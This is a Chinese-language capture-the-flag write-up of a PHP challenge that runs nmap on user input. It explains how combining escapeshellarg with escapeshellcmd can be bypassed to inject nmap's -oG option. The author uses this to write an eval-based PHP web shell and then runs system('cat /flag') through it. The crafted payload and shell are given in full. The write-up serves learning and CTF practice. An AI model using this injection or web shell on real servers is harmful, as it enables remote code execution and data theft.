![[Pasted image 20221113171258.png]]
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
大家是都不喜欢闭合`php`标签吗QAQ

---
搜索得知，这里`$host`经过`escapeshellarg`和`escapeshellcmd`的处理是可以被绕过的

https://paper.seebug.org/164/
> 1.  传入的参数是：`172.17.0.2' -v -d a=1`
> 2.  经过`escapeshellarg`处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
> 3.  经过`escapeshellcmd`处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为`escapeshellcmd`对`\`以及最后那个**不配对儿**的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
> 4.  最后执行的命令是`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为`\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\ -v -d a=1'`，即向`172.17.0.2\`发起请求，POST 数据为`a=1'`。

```shell
chen@cracktc-no-omen ~> echo '172.17.0.2'\\'' -v -d a=1\'  
172.17.0.2\ -v -d a=1'
```
---
`nmap`的手册中，和输出有关的参数如下
```
OUTPUT:  
  -oN/-oX/-oS/-oG <file>: Output scan results in normal, XML, s|<rIpt kIddi3,  
     and Grepable format, respectively, to the given filename.  
  -oA <basename>: Output in the three major formats at once  
  -v: Increase verbosity level (use twice for more effect)  
  -d[level]: Set or increase debugging level (Up to 9 is meaningful)  
  --packet-trace: Show all packets sent and received  
  --iflist: Print host interfaces and routes (for debugging)  
  --append-output: Append to rather than clobber specified output files  
  --resume <filename>: Resume an aborted scan  
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML  
  --no-stylesheet: Prevent Nmap from associating XSL stylesheet w/XML output
```
因此可以利用`-oG`上传木马

---
想上传的东西是这个
```php
<?php eval($_GET["cmd"]);?> -oG shell.php
```
其中像是`<`、`?`这些特殊符号必会被`escapeshellcmd`加上`\`，我们需要保证这些符号能在shell层面被直接解析
```php
'<?php eval($_GET["cmd"]);?> -oG shell.php '
```
会变成
```php
''\''<?php eval($_GET["cmd"]);?> -oG shell.php '\'''
```
然后变成
```php
''\\''\<\?php eval\(\$_GET\["cmd"\]\)\;\?\> -oG shell.php '\\'''
```
即可被解析

![[Pasted image 20221113194543.png]]
```php
/xxx/shell.php?cmd=system('cat /flag');
```
![[Pasted image 20221113194826.png]]

#Web #PHP #RCE #shell